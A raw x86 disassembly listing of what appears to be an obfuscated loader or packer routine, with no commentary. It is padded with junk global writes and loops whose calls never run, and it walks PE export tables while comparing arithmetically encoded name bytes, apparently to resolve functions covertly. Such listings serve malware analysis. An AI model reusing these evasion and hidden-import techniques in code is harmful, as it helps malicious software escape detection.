  423441:	adc    DWORD PTR ds:0x42a010,0x1100
  42344b:	add    esi,edx
  42344d:	imul   esi,DWORD PTR [eax]
  423450:	mov    DWORD PTR [eax],esi
  423452:	mov    DWORD PTR ds:0x42b008,0x673b
  42345c:	jmp    0x423470
  423461:	adc    DWORD PTR ds:0x42a000,0x51cf
  42346b:	mov    esi,DWORD PTR [ebp+0x14]
  42346e:	xor    DWORD PTR [eax],esi
  423470:	mov    eax,DWORD PTR [ebp-0x4]
  423473:	add    DWORD PTR ds:0x42b004,ebx
  423479:	mov    edi,DWORD PTR [ebp+0x10]
  42347c:	mov    esi,DWORD PTR ds:0x42b014
  423482:	xor    DWORD PTR ds:0x42d010,esi
  423488:	xor    edi,ecx
  42348a:	mov    esi,0xffcd8d14
  42348f:	mov    ebx,esi
  423491:	and    DWORD PTR ds:0x42c004,0x42c010
  42349b:	sub    ebx,edi
  42349d:	add    DWORD PTR [eax],ebx
  42349f:	movzx  edi,WORD PTR ds:0x42a004
  4234a6:	adc    DWORD PTR ds:0x42b00c,edi
  4234ac:	mov    eax,DWORD PTR [ebp-0x4]
  4234af:	or     edi,0x4676
  4234b5:	mov    edi,DWORD PTR [ebp-0x8]
  4234b8:	adc    DWORD PTR ds:0x42b010,0x66f8
  4234c2:	add    edi,DWORD PTR [eax]
  4234c4:	mov    DWORD PTR [ebp-0x8],edi
  4234c7:	and    DWORD PTR ds:0x429008,0x0
  4234d1:	jmp    0x4234e3
  4234d6:	mov    edi,DWORD PTR ds:0x429008
  4234dc:	inc    edi
  4234dd:	mov    DWORD PTR ds:0x429008,edi
  4234e3:	cmp    DWORD PTR ds:0x429008,0x1e
  4234ea:	jae    0x423549
  4234f0:	cmp    DWORD PTR ds:0x429008,0xe
  4234f7:	jbe    0x423549
  4234fd:	jmp    0x423528
  423502:	push   DWORD PTR [ebp-0x10]
  423505:	push   DWORD PTR [ebp-0x10]
  423508:	push   0x1905
  42350d:	push   0x5e48
  423512:	push   DWORD PTR [ebp-0x14]
  423515:	push   DWORD PTR [ebp-0xc]
  423518:	push   0x1ad8
  42351d:	push   0x42f0bb
  423522:	call   DWORD PTR ds:0x430047
  423528:	cmp    DWORD PTR ds:0x429008,0xd
  42352f:	jne    0x423544
  423535:	xor    edi,edi
  423537:	or     edi,DWORD PTR ds:0x429008
  42353d:	inc    edi
  42353e:	mov    DWORD PTR ds:0x429008,edi
  423544:	jmp    0x4234d6
  423549:	mov    eax,DWORD PTR [ebp+0xc]
  42354c:	mov    edi,DWORD PTR [ebp+0xc]
  42354f:	and    DWORD PTR ds:0x429028,0x2929
  423559:	xor    edi,ecx
  42355b:	sbb    DWORD PTR ds:0x42c000,0x429018
  423565:	xor    eax,ecx
  423567:	lea    eax,[eax+edi*1+0x64e5d8]
  42356e:	xor    edi,DWORD PTR ds:0x42b008
  423574:	mov    edi,DWORD PTR [ebp+0xc]
  423577:	xor    edi,ecx
  423579:	add    edi,edx
  42357b:	imul   eax,edi
  42357e:	mov    edi,DWORD PTR [ebp+0xc]
  423581:	xor    edi,ecx
  423583:	sub    edi,eax
  423585:	mov    eax,DWORD PTR [ebp-0x4]
  423588:	add    edi,edx
  42358a:	cmp    DWORD PTR [eax],edi
  42358c:	mov    eax,DWORD PTR [ebp-0x4]
  42358f:	mov    edi,DWORD PTR [ebp+0x10]
  423592:	jg     0x4235a5
  423598:	xor    edi,ecx
  42359a:	mov    ebx,esi
  42359c:	sub    ebx,edi
  42359e:	add    DWORD PTR [eax],ebx
  4235a0:	jmp    0x4235ab
  4235a5:	xor    edi,ecx
  4235a7:	add    edi,edx
  4235a9:	add    DWORD PTR [eax],edi
  4235ab:	mov    eax,DWORD PTR [ebp-0x8]
  4235ae:	mov    edi,DWORD PTR [ebp-0x10]
  4235b1:	mov    eax,DWORD PTR [eax]
  4235b3:	xor    edi,ecx
  4235b5:	add    edi,0x3272eb
  4235bb:	not    edi
  4235bd:	and    eax,edi
  4235bf:	movsx  di,BYTE PTR [eax+0x1]
  4235c4:	mov    ebx,0x3b56
  4235c9:	sub    di,bx
  4235cc:	mov    ebx,0x8a94
  4235d1:	xor    di,bx
  4235d4:	mov    ebx,0x4f90
  4235d9:	cmp    di,bx
  4235dc:	jne    0x423604
  4235e2:	movsx  di,BYTE PTR [eax]
  4235e6:	mov    ebx,0x3b56
  4235eb:	sub    di,bx
  4235ee:	mov    ebx,0x8a94
  4235f3:	xor    di,bx
  4235f6:	mov    ebx,0x4e63
  4235fb:	cmp    di,bx
  4235fe:	je     0x423614
  423604:	mov    edi,DWORD PTR [ebp-0x10]
  423607:	xor    edi,ecx
  423609:	mov    ebx,esi
  42360b:	sub    ebx,edi
  42360d:	add    eax,ebx
  42360f:	jmp    0x4235bf
  423614:	mov    esi,DWORD PTR [ebp-0x14]
  423617:	mov    esi,DWORD PTR [esi]
  423619:	mov    edi,DWORD PTR [eax+0x3c]
  42361c:	lea    esi,[edi+esi*8+0x78]
  423620:	mov    esi,DWORD PTR [esi+eax*1]
  423623:	mov    DWORD PTR [ebp-0x8],esi
  423626:	mov    esi,DWORD PTR [ebp+0x8]
  423629:	xor    esi,ecx
  42362b:	add    esi,edx
  42362d:	mov    DWORD PTR [ebp-0x14],esi
  423630:	mov    esi,DWORD PTR [ebp+0x8]
  423633:	mov    edi,DWORD PTR [ebp-0x8]
  423636:	xor    esi,ecx
  423638:	add    esi,edx
  42363a:	pop    ebx
  42363b:	cmp    edi,esi
  42363d:	jne    0x42365b
  423643:	mov    eax,DWORD PTR [ebp+0xc]
  423646:	xor    eax,ecx
  423648:	mov    ecx,DWORD PTR [ebp-0x8]
  42364b:	add    eax,edx
  42364d:	imul   eax,ecx
  423650:	mov    DWORD PTR [ebp-0x8],eax
  423653:	push   DWORD PTR [ebp+0x18]
  423656:	jmp    0x4236af
  42365b:	mov    ecx,DWORD PTR [ebp-0x8]
  42365e:	add    ecx,eax
  423660:	mov    DWORD PTR [ebp-0x14],ecx
  423663:	mov    ecx,DWORD PTR [ebp-0x14]
  423666:	mov    ecx,DWORD PTR [ecx+0xc]
  423669:	movsx  cx,BYTE PTR [ecx+eax*1]
  42366e:	mov    edx,0x3b56
  423673:	sub    cx,dx
  423676:	mov    edx,0x8a94
  42367b:	xor    cx,dx
  42367e:	mov    edx,0x4e61
  423683:	cmp    cx,dx
  423686:	jne    0x423653
  42368c:	mov    ecx,DWORD PTR ds:0x42f36b
  423692:	mov    ecx,DWORD PTR [ecx+0x198]
  423698:	mov    DWORD PTR [ecx],eax
  42369a:	jmp    0x4236c0
  42369f:	mov    ecx,DWORD PTR [ebp+0x18]
  4236a2:	cmp    ecx,0xf89c85b1
  4236a8:	jne    0x4236c0
  4236ae:	push   eax
  4236af:	push   DWORD PTR [ebp+0x14]
  4236b2:	push   DWORD PTR [ebp+0x10]
  4236b5:	push   DWORD PTR [ebp+0xc]
  4236b8:	push   DWORD PTR [ebp+0x8]
  4236bb:	call   0x4231be
  4236c0:	pop    edi
  4236c1:	pop    esi
  4236c2:	leave  
  4236c3:	ret    0x14
  4236c6:	push   ebp
  4236c7:	mov    ebp,esp
  4236c9:	sub    esp,0x70
  4236cc:	push   edi
  4236cd:	push   0x42f47b
  4236d2:	and    DWORD PTR ds:0x42d004,0x1ec1
  4236dc:	call   DWORD PTR ds:0x43002f
  4236e2:	mov    edi,DWORD PTR ds:0x42d014
  4236e8:	sbb    DWORD PTR ds:0x42b014,edi
  4236ee:	mov    edi,DWORD PTR ds:0x43004f
  4236f4:	sbb    DWORD PTR ds:0x42a014,0x42c000
  4236fe:	push   0x42f49b
  423703:	call   edi
  423705:	adc    DWORD PTR ds:0x429004,0x5ead
  42370f:	test   eax,eax
  423711:	je     0x423753
  423717:	push   0x0
  423719:	adc    DWORD PTR ds:0x42d000,0x42c004
  423723:	push   0x0
  423725:	add    DWORD PTR ds:0x42b008,0x118d
  42372f:	push   0x42f50b
  423734:	and    DWORD PTR ds:0x42900c,0x1fff
  42373e:	call   DWORD PTR ds:0x43001f
  423744:	mov    DWORD PTR ds:0x42a01c,0x2e2c
  42374e:	jmp    0x42463b
  423753:	push   esi
  423754:	xor    esi,esi
  423756:	or     esi,DWORD PTR ds:0x42c000
  42375c:	sub    esi,DWORD PTR ds:0x42901c
  423762:	mov    DWORD PTR ds:0x42c000,esi
  423768:	mov    esi,DWORD PTR ds:0x430043
  42376e:	add    DWORD PTR ds:0x429024,0x42a000
  423778:	lea    eax,[ebp-0x70]
  42377b:	push   eax
  42377c:	xor    DWORD PTR ds:0x42b010,0x42a00c
  423786:	push   0x42f4d7
  42378b:	dec    DWORD PTR ds:0x42900c
  423791:	call   esi
  423793:	test   eax,eax
  423795:	mov    DWORD PTR ds:0x42b018,0x2e12
  42379f:	je     0x4237b9
  4237a5:	push   0x42f54b
  4237aa:	mov    DWORD PTR ds:0x42c014,0x3c92
  4237b4:	jmp    0x423854
  4237b9:	sbb    DWORD PTR ds:0x429020,0x6e1f
  4237c3:	push   0x42f563
  4237c8:	call   edi
  4237ca:	test   eax,eax
  4237cc:	mov    DWORD PTR ds:0x42b010,0x136e
  4237d6:	je     0x423804
  4237dc:	adc    DWORD PTR ds:0x42c010,0x42a008
  4237e6:	push   0x0
  4237e8:	push   0x0
  4237ea:	push   0x42f5d3
  4237ef:	add    DWORD PTR ds:0x42b004,0x42c014
  4237f9:	call   DWORD PTR ds:0x43001f
  4237ff:	jmp    0x42463a
  423804:	xor    DWORD PTR ds:0x429014,0x61d8
  42380e:	lea    eax,[ebp-0x70]
  423811:	sbb    DWORD PTR ds:0x42c01c,0x42d004
  42381b:	push   eax
  42381c:	neg    DWORD PTR ds:0x42c018
  423822:	push   0x42f59f
  423827:	call   esi
  423829:	sbb    DWORD PTR ds:0x429020,0x42a000
  423833:	test   eax,eax
  423835:	mov    DWORD PTR ds:0x42b014,0x3bd8
  42383f:	je     0x423869
  423845:	or     DWORD PTR ds:0x42a000,0x5797
  42384f:	push   0x42f613
  423854:	sub    DWORD PTR ds:0x429020,0x7429
  42385e:	call   DWORD PTR ds:0x430023
  423864:	jmp    0x42463a
  423869:	mov    DWORD PTR [ebp-0x2c],0x0
  423870:	mov    eax,ds:0x42d018
  423875:	sbb    eax,DWORD PTR ds:0x42c018
  42387b:	mov    ds:0x42d018,eax
  423880:	mov    eax,DWORD PTR [ebp-0x20]
  423883:	mov    DWORD PTR [ebp-0x20],eax
  423886:	mov    DWORD PTR ds:0x42a004,0x1b
  423890:	cmp    DWORD PTR ds:0x42a004,0x0
  423897:	je     0x4238ee
  42389d:	cmp    DWORD PTR ds:0x42a004,0x2
  4238a4:	jbe    0x4238ee
  4238aa:	jmp    0x4238c0
  4238af:	push   DWORD PTR [ebp-0x28]
  4238b2:	push   0x7240
  4238b7:	push   DWORD PTR [ebp-0x1c]
  4238ba:	call   DWORD PTR ds:0x43004b
  4238c0:	cmp    DWORD PTR ds:0x42a004,0x3
  4238c7:	jne    0x4238dc
  4238cd:	xor    edx,edx
  4238cf:	add    edx,DWORD PTR ds:0x42a004
  4238d5:	dec    edx
  4238d6:	mov    DWORD PTR ds:0x42a004,edx
  4238dc:	mov    edx,DWORD PTR ds:0x42a004
  4238e2:	dec    edx
  4238e3:	mov    DWORD PTR ds:0x42a004,edx
  4238e9:	jmp    0x423890
  4238ee:	mov    ecx,0xf89c85b0
  4238f3:	mov    DWORD PTR [ebp-0x4],ecx
  4238f6:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  4238fd:	lea    eax,[ebp-0x14]
  423900:	adc    edi,edi
  423902:	mov    DWORD PTR [ebp-0x2c],eax
  423905:	lea    eax,[ebp-0x18]
  423908:	sbb    edi,0x185f
  42390e:	mov    DWORD PTR [ebp-0x24],eax
  423911:	inc    edi
  423912:	mov    eax,ds:0x42f36b
  423917:	mov    eax,DWORD PTR [eax+0x1c8]
  42391d:	add    DWORD PTR ds:0x42b014,edi
  423923:	mov    eax,DWORD PTR [eax]
  423925:	mov    edx,DWORD PTR [ebp-0x24]
  423928:	mov    edi,0x75108a4
  42392d:	mov    DWORD PTR ds:0x42b004,0x30ab
  423937:	xor    eax,edi
  423939:	sbb    DWORD PTR ds:0x42c000,0x429024
  423943:	push   ebx
  423944:	sub    ebx,0x6eba
  42394a:	mov    ebx,0x3272ec
  42394f:	adc    DWORD PTR ds:0x42d018,0x42c01c
  423959:	add    eax,ebx
  42395b:	mov    DWORD PTR ds:0x42d008,0x4b8b
  423965:	mov    DWORD PTR [edx],eax
  423967:	mov    eax,0x64e4
  42396c:	mov    eax,ds:0x42fed3
  423971:	cmp    eax,0x434cdbf8
  423976:	jne    0x423a8e
  42397c:	mov    eax,DWORD PTR [ebp-0x4]
  42397f:	inc    DWORD PTR ds:0x429014
  423985:	mov    edx,DWORD PTR ds:0x42f36b
  42398b:	and    DWORD PTR ds:0x429024,0x0
  423995:	mov    esi,DWORD PTR ds:0x429024
  42399b:	inc    esi
  42399c:	mov    DWORD PTR ds:0x429024,esi
  4239a2:	cmp    DWORD PTR ds:0x429024,0xa
  4239a9:	jg     0x4239eb
  4239af:	jmp    0x4239c4
  4239b4:	push   0x42c018
  4239b9:	push   0x42f19b
  4239be:	call   DWORD PTR ds:0x43000b
  4239c4:	cmp    DWORD PTR ds:0x429024,0x9
  4239cb:	jne    0x4239de
  4239d1:	mov    esi,DWORD PTR ds:0x429024
  4239d7:	inc    esi
  4239d8:	mov    DWORD PTR ds:0x429024,esi
  4239de:	cmp    DWORD PTR ds:0x429024,0x12
  4239e5:	jb     0x423995
  4239eb:	mov    edx,DWORD PTR [edx+0x198]
  4239f1:	and    DWORD PTR ds:0x429008,edx
  4239f7:	xor    eax,edi
  4239f9:	or     esi,DWORD PTR ds:0x42901c
  4239ff:	add    eax,ebx
  423a01:	xor    esi,0x27f0
  423a07:	mov    DWORD PTR [edx],eax
  423a09:	mov    eax,ds:0x42b01c
  423a0e:	adc    eax,DWORD PTR ds:0x42a008
  423a14:	mov    ds:0x42b01c,eax
  423a19:	mov    eax,DWORD PTR [ebp-0x4]
  423a1c:	sbb    esi,0x278
  423a22:	xor    eax,edi
  423a24:	mov    DWORD PTR ds:0x42a004,0x14
  423a2e:	cmp    DWORD PTR ds:0x42a004,0x0
  423a35:	je     0x423a87
  423a3b:	cmp    DWORD PTR ds:0x42a004,0x3
  423a42:	ja     0x423a87
  423a48:	jmp    0x423a5b
  423a4d:	push   0x42d01c
  423a52:	push   DWORD PTR [ebp-0x20]
  423a55:	call   DWORD PTR ds:0x43000f
  423a5b:	cmp    DWORD PTR ds:0x42a004,0x4
  423a62:	jne    0x423a75
  423a68:	mov    esi,DWORD PTR ds:0x42a004
  423a6e:	dec    esi
  423a6f:	mov    DWORD PTR ds:0x42a004,esi
  423a75:	mov    esi,DWORD PTR ds:0x42a004
  423a7b:	dec    esi
  423a7c:	mov    DWORD PTR ds:0x42a004,esi
  423a82:	jmp    0x423a2e
  423a87:	add    eax,ebx
  423a89:	mov    ds:0x42fed3,eax
  423a8e:	movzx  eax,WORD PTR ds:0x42d008
  423a95:	and    DWORD PTR ds:0x429028,eax
  423a9b:	mov    eax,ds:0x42f36b
  423aa0:	mov    eax,DWORD PTR [eax+0x18c]
  423aa6:	adc    DWORD PTR ds:0x429014,0x7baf
  423ab0:	mov    eax,DWORD PTR [eax]
  423ab2:	mov    DWORD PTR ds:0x42b004,0x12
  423abc:	cmp    DWORD PTR ds:0x42b004,0x0
  423ac3:	je     0x423b0d
  423ac9:	cmp    DWORD PTR ds:0x42b004,0x5
  423ad0:	ja     0x423b0d
  423ad6:	jmp    0x423ae1
  423adb:	call   DWORD PTR ds:0x430013
  423ae1:	cmp    DWORD PTR ds:0x42b004,0x6
  423ae8:	jne    0x423afb
  423aee:	mov    esi,DWORD PTR ds:0x42b004
  423af4:	dec    esi
  423af5:	mov    DWORD PTR ds:0x42b004,esi
  423afb:	mov    esi,DWORD PTR ds:0x42b004
  423b01:	dec    esi
  423b02:	mov    DWORD PTR ds:0x42b004,esi
  423b08:	jmp    0x423abc
  423b0d:	mov    DWORD PTR [ebp-0x34],eax
  423b10:	and    DWORD PTR ds:0x42900c,0x0
  423b1a:	jmp    0x423b2c
  423b1f:	mov    esi,DWORD PTR ds:0x42900c
  423b25:	inc    esi
  423b26:	mov    DWORD PTR ds:0x42900c,esi
  423b2c:	cmp    DWORD PTR ds:0x42900c,0x1b
  423b33:	jae    0x423b7c
  423b39:	cmp    DWORD PTR ds:0x42900c,0xb
  423b40:	jl     0x423b7c
  423b46:	jmp    0x423b5b
  423b4b:	push   0x42f14f
  423b50:	push   0x1
  423b52:	push   DWORD PTR [ebp-0x24]
  423b55:	call   DWORD PTR ds:0x430017
  423b5b:	cmp    DWORD PTR ds:0x42900c,0xa
  423b62:	jne    0x423b77
  423b68:	xor    esi,esi
  423b6a:	add    esi,DWORD PTR ds:0x42900c
  423b70:	inc    esi
  423b71:	mov    DWORD PTR ds:0x42900c,esi
  423b77:	jmp    0x423b1f
  423b7c:	mov    eax,0xf89c85bc
  423b81:	or     DWORD PTR ds:0x42b000,ecx
  423b87:	mov    DWORD PTR [ebp-0x24],eax
  423b8a:	mov    DWORD PTR [ebp-0x24],eax
  423b8d:	xor    DWORD PTR ds:0x42d018,ecx
  423b93:	mov    DWORD PTR [ebp-0x24],eax
  423b96:	dec    esi
  423b97:	mov    DWORD PTR [ebp-0x24],ecx
  423b9a:	or     esi,DWORD PTR ds:0x42c000
  423ba0:	mov    DWORD PTR [ebp-0x38],eax
  423ba3:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  423baa:	adc    DWORD PTR ds:0x42901c,ecx
  423bb0:	mov    esi,DWORD PTR [ebp-0x4]
  423bb3:	sbb    DWORD PTR ds:0x429004,0x42b01c
  423bbd:	xor    esi,edi
  423bbf:	add    esi,ebx
  423bc1:	jmp    0x423d10
  423bc6:	mov    eax,DWORD PTR [ebp-0x8]
  423bc9:	add    DWORD PTR ds:0x42b008,0x42d014
  423bd3:	xor    eax,edi
  423bd5:	sub    DWORD PTR ds:0x429004,0x42b014
  423bdf:	lea    eax,[eax+esi*1+0x3272ec]
  423be6:	and    DWORD PTR ds:0x42d00c,0x42a00c
  423bf0:	push   eax
  423bf1:	mov    DWORD PTR ds:0x42c018,0x956
  423bfb:	mov    eax,DWORD PTR [ebp-0x24]
  423bfe:	add    DWORD PTR ds:0x42b018,0x42d004
  423c08:	xor    eax,edi
  423c0a:	and    DWORD PTR ds:0x42d010,0x42b01c
  423c14:	lea    eax,[ebp+eax*1+0x3272f4]
  423c1b:	xor    DWORD PTR ds:0x42b018,0x429018
  423c25:	push   eax
  423c26:	adc    DWORD PTR ds:0x42a014,0x1370
  423c30:	mov    eax,ds:0x42f36b
  423c35:	add    DWORD PTR ds:0x42d014,0xcb6
  423c3f:	push   DWORD PTR [eax+0x1bc]
  423c45:	call   0x424640
  423c4a:	and    DWORD PTR ds:0x429004,0x0
  423c54:	mov    eax,ds:0x429004
  423c59:	inc    eax
  423c5a:	mov    ds:0x429004,eax
  423c5f:	cmp    DWORD PTR ds:0x429004,0x7
  423c66:	jl     0x423cbb
  423c6c:	jmp    0x423c96
  423c71:	push   0x50e0
  423c76:	push   DWORD PTR [ebp-0x10]
  423c79:	push   0x429008
  423c7e:	push   DWORD PTR [ebp-0x18]
  423c81:	push   0x60f5
  423c86:	push   0x7920
  423c8b:	push   0x2e0e
  423c90:	call   DWORD PTR ds:0x43001b
  423c96:	cmp    DWORD PTR ds:0x429004,0x6
  423c9d:	jne    0x423cae
  423ca3:	mov    eax,ds:0x429004
  423ca8:	inc    eax
  423ca9:	mov    ds:0x429004,eax
  423cae:	cmp    DWORD PTR ds:0x429004,0x11
  423cb5:	jb     0x423c54
  423cbb:	mov    eax,DWORD PTR [ebp-0x8]
  423cbe:	xor    eax,edi
  423cc0:	mov    DWORD PTR ds:0x42d004,0x15
  423cca:	cmp    DWORD PTR ds:0x42d004,0x0
  423cd1:	je     0x423d09
  423cd7:	cmp    DWORD PTR ds:0x42d004,0x20
  423cde:	jle    0x423d09
  423ce4:	jmp    0x423cf5
  423ce9:	push   DWORD PTR [ebp-0x1c]
  423cec:	push   DWORD PTR [ebp-0x14]
  423cef:	call   DWORD PTR ds:0x430027
  423cf5:	xor    ecx,ecx
  423cf7:	add    ecx,DWORD PTR ds:0x42d004
  423cfd:	dec    ecx
  423cfe:	mov    DWORD PTR ds:0x42d004,ecx
  423d04:	jmp    0x423cca
  423d09:	lea    esi,[esi+eax*1+0x3272ec]
  423d10:	neg    eax
  423d12:	mov    eax,DWORD PTR [ebp-0x8]
  423d15:	adc    DWORD PTR ds:0x42d000,0x333b
  423d1f:	mov    ecx,DWORD PTR [ebp-0x8]
  423d22:	xor    DWORD PTR ds:0x42d014,0x42a014
  423d2c:	xor    ecx,edi
  423d2e:	and    DWORD PTR ds:0x42d00c,0x42b018
  423d38:	xor    eax,edi
  423d3a:	add    eax,ecx
  423d3c:	mov    ecx,DWORD PTR [ebp-0x8]
  423d3f:	and    DWORD PTR ds:0x42a008,0x42d00c
  423d49:	xor    ecx,edi
  423d4b:	mov    DWORD PTR ds:0x42b008,0x48ca
  423d55:	lea    eax,[eax+ecx*1+0x9758c4]
  423d5c:	mov    DWORD PTR ds:0x42a01c,0x2b5
  423d66:	cmp    esi,eax
  423d68:	mov    DWORD PTR ds:0x42b01c,0x6741
  423d72:	jbe    0x423bc6
  423d78:	mov    eax,DWORD PTR [ebp+0xc]
  423d7b:	mov    ds:0x42f1ef,eax
  423d80:	sub    ecx,ecx
  423d82:	mov    eax,DWORD PTR [ebp+0x10]
  423d85:	sub    ecx,DWORD PTR ds:0x42d018
  423d8b:	mov    ds:0x42f443,eax
  423d90:	mov    eax,ds:0x42f1ef
  423d95:	or     DWORD PTR ds:0x42c008,ebx
  423d9b:	mov    ecx,DWORD PTR [ebp-0x2c]
  423d9e:	add    DWORD PTR ds:0x429014,0xb75
  423da8:	sub    eax,ebx
  423daa:	add    DWORD PTR ds:0x42b000,0x59bf
  423db4:	xor    eax,edi
  423db6:	mov    DWORD PTR ds:0x42c014,0x601c
  423dc0:	mov    DWORD PTR [ecx],eax
  423dc2:	not    eax
  423dc4:	mov    eax,DWORD PTR [ebp-0x20]
  423dc7:	mov    DWORD PTR ds:0x429000,0x4eb8
  423dd1:	cmp    eax,0xf89c85b0
  423dd6:	jne    0x4241d5
  423ddc:	xor    DWORD PTR ds:0x42a004,0x4e87
  423de6:	lea    eax,[ebp-0x10]
  423de9:	mov    DWORD PTR [ebp-0x40],eax
  423dec:	sbb    DWORD PTR ds:0x42900c,0x429018
  423df6:	lea    eax,[ebp+0x4]
  423df9:	mov    DWORD PTR [ebp-0x10],eax
  423dfc:	or     DWORD PTR ds:0x42c000,0x26f1
  423e06:	mov    eax,DWORD PTR [ebp-0x10]
  423e09:	test   eax,eax
  423e0b:	je     0x424592
  423e11:	add    DWORD PTR ds:0x42b00c,0x193f
  423e1b:	push   0x42f62b
  423e20:	call   DWORD PTR ds:0x43004f
  423e26:	add    DWORD PTR ds:0x42c010,0x3f0d
  423e30:	test   eax,eax
  423e32:	mov    DWORD PTR ds:0x42c010,0x4f7a
  423e3c:	je     0x423e5a
  423e42:	push   0x0
  423e44:	push   0x0
  423e46:	mov    DWORD PTR ds:0x42b00c,0x5e6e
  423e50:	push   0x42f69b
  423e55:	jmp    0x424606
  423e5a:	or     DWORD PTR ds:0x42d004,0x382d
  423e64:	lea    eax,[ebp-0x70]
  423e67:	add    DWORD PTR ds:0x42d004,0x42b01c
  423e71:	push   eax
  423e72:	xor    DWORD PTR ds:0x42b00c,0x6609
  423e7c:	push   0x42f667
  423e81:	or     DWORD PTR ds:0x42d000,0x2f88
  423e8b:	call   DWORD PTR ds:0x430043
  423e91:	or     DWORD PTR ds:0x429000,0x1a50
  423e9b:	test   eax,eax
  423e9d:	je     0x423ec1
  423ea3:	mov    DWORD PTR ds:0x42c008,0x985
  423ead:	push   0x42f6db
  423eb2:	mov    DWORD PTR ds:0x42b000,0x1ac7
  423ebc:	jmp    0x424629
  423ec1:	and    DWORD PTR ds:0x42b008,0x0
  423ecb:	jmp    0x423edf
  423ed0:	xor    esi,esi
  423ed2:	xor    esi,DWORD PTR ds:0x42b008
  423ed8:	inc    esi
  423ed9:	mov    DWORD PTR ds:0x42b008,esi
  423edf:	cmp    DWORD PTR ds:0x42b008,0x1c
  423ee6:	jae    0x423f11
  423eec:	cmp    DWORD PTR ds:0x42b008,0x27
  423ef3:	jbe    0x423f11
  423ef9:	jmp    0x423f0c
  423efe:	push   DWORD PTR [ebp-0x24]
  423f01:	push   0x545e
  423f06:	call   DWORD PTR ds:0x43002b
  423f0c:	jmp    0x423ed0
  423f11:	mov    eax,DWORD PTR [ebp-0xc]
  423f14:	not    eax
  423f16:	mov    eax,DWORD PTR [ebp-0x8]
  423f19:	sbb    DWORD PTR ds:0x429018,0x42d000
  423f23:	mov    eax,DWORD PTR [ebp-0x4]
  423f26:	mov    DWORD PTR ds:0x429014,0x18
  423f30:	cmp    DWORD PTR ds:0x429014,0x0
  423f37:	je     0x423f76
  423f3d:	cmp    DWORD PTR ds:0x429014,0x23
  423f44:	jbe    0x423f76
  423f4a:	jmp    0x423f64
  423f4f:	push   0x8e6d
  423f54:	push   0x42a018
  423f59:	push   0x42f09c
  423f5e:	call   DWORD PTR ds:0x430033
  423f64:	mov    ecx,DWORD PTR ds:0x429014
  423f6a:	dec    ecx
  423f6b:	mov    DWORD PTR ds:0x429014,ecx
  423f71:	jmp    0x423f30
  423f76:	mov    DWORD PTR [ebp+0xc],eax
  423f79:	xor    ecx,ecx
  423f7b:	or     ecx,DWORD PTR ds:0x424ad1
  423f81:	mov    ecx,DWORD PTR [ecx]
  423f83:	sbb    DWORD PTR ds:0x429014,ecx
  423f89:	mov    eax,eax
  423f8b:	mov    eax,ds:0x42f36b
  423f90:	mov    eax,DWORD PTR [eax+0x1c8]
  423f96:	not    DWORD PTR ds:0x42c01c
  423f9c:	mov    eax,DWORD PTR [eax]
  423f9e:	add    DWORD PTR ds:0x429024,ebx
  423fa4:	cdq    
  423fa5:	mov    esi,0xfabdbedd
  423faa:	dec    ecx
  423fab:	add    eax,esi
  423fad:	mov    ecx,0x2e63
  423fb2:	adc    edx,0xffffffff
  423fb5:	and    DWORD PTR [ebp-0x38],0x0
  423fb9:	and    DWORD PTR ds:0x42d000,0x0
  423fc3:	jmp    0x423fd5
  423fc8:	mov    ecx,DWORD PTR ds:0x42d000
  423fce:	inc    ecx
  423fcf:	mov    DWORD PTR ds:0x42d000,ecx
  423fd5:	cmp    DWORD PTR ds:0x42d000,0x11
  423fdc:	jae    0x424023
  423fe2:	cmp    DWORD PTR ds:0x42d000,0x7
  423fe9:	jb     0x424023
  423fef:	jmp    0x424002
  423ff4:	push   0x182f
  423ff9:	push   DWORD PTR [ebp-0x20]
  423ffc:	call   DWORD PTR ds:0x430037
  424002:	cmp    DWORD PTR ds:0x42d000,0x6
  424009:	jne    0x42401e
  42400f:	xor    ecx,ecx
  424011:	add    ecx,DWORD PTR ds:0x42d000
  424017:	inc    ecx
  424018:	mov    DWORD PTR ds:0x42d000,ecx
  42401e:	jmp    0x423fc8
  424023:	xor    edx,0x0
  424026:	and    DWORD PTR ds:0x42d010,0x0
  424030:	jmp    0x424042
  424035:	mov    ecx,DWORD PTR ds:0x42d010
  42403b:	inc    ecx
  42403c:	mov    DWORD PTR ds:0x42d010,ecx
  424042:	cmp    DWORD PTR ds:0x42d010,0x17
  424049:	jae    0x424076
  42404f:	cmp    DWORD PTR ds:0x42d010,0x26
  424056:	jl     0x424076
  42405c:	jmp    0x424071
  424061:	push   0x42f181
  424066:	push   0x0
  424068:	push   DWORD PTR [ebp-0x20]
  42406b:	call   DWORD PTR ds:0x43003b
  424071:	jmp    0x424035
  424076:	mov    DWORD PTR [ebp-0x24],edx
  424079:	mov    DWORD PTR ds:0x42b000,0x1d
  424083:	cmp    DWORD PTR ds:0x42b000,0x0
  42408a:	je     0x4240d7
  424090:	cmp    DWORD PTR ds:0x42b000,0xb
  424097:	jbe    0x4240d7
  42409d:	jmp    0x4240ab
  4240a2:	push   DWORD PTR [ebp-0x20]
  4240a5:	call   DWORD PTR ds:0x43003f
  4240ab:	cmp    DWORD PTR ds:0x42b000,0xc
  4240b2:	jne    0x4240c5
  4240b8:	mov    edx,DWORD PTR ds:0x42b000
  4240be:	dec    edx
  4240bf:	mov    DWORD PTR ds:0x42b000,edx
  4240c5:	mov    edx,DWORD PTR ds:0x42b000
  4240cb:	dec    edx
  4240cc:	mov    DWORD PTR ds:0x42b000,edx
  4240d2:	jmp    0x424083
  4240d7:	mov    edx,DWORD PTR [ebp+0xc]
  4240da:	mov    DWORD PTR [ebp-0x3c],edx
  4240dd:	and    DWORD PTR ds:0x42c018,0x0
  4240e7:	mov    ecx,DWORD PTR ds:0x42c018
  4240ed:	inc    ecx
  4240ee:	mov    DWORD PTR ds:0x42c018,ecx
  4240f4:	cmp    DWORD PTR ds:0x42c018,0xa
  4240fb:	ja     0x424155
  424101:	jmp    0x42412e
  424106:	push   0x3e21
  42410b:	push   0x8ac9
  424110:	push   DWORD PTR [ebp-0x24]
  424113:	push   DWORD PTR [ebp-0x20]
  424116:	push   0x8a2e
  42411b:	push   DWORD PTR [ebp-0x10]
  42411e:	push   0x6472
  424123:	push   0x42f0d5
  424128:	call   DWORD PTR ds:0x430047
  42412e:	cmp    DWORD PTR ds:0x42c018,0x9
  424135:	jne    0x424148
  42413b:	mov    ecx,DWORD PTR ds:0x42c018
  424141:	inc    ecx
  424142:	mov    DWORD PTR ds:0x42c018,ecx
  424148:	cmp    DWORD PTR ds:0x42c018,0x10
  42414f:	jb     0x4240e7
